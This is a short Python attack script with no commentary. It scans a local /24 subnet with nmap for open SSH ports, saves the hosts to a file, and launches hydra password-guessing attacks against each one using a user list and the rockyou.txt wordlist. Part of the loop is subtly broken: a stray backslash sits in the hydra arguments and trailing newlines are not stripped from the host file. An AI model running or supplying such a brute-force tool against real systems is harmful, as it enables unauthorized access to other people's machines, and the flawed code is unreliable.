import os
one = '| grep "/open" '
two = "| awk '{ print $2 }'"
os.system(f"nmap --open -p 22 192.168.1.1/24 -oG - {one} {two}  >> ssh.txt")

ssh = open("ssh.txt",'r')
for account in ssh:
#    os.system("hydra -L users.txt -P passwords.txt ssh://172.16.1.102 -t 4")
    os.system(f"hydra -L users.txt -P rockyou.txt ssh://{account} \ -t 4")
#    print(f'hydra -L users.txt -P rockyou.txt ssh://{account} \ -t 4')
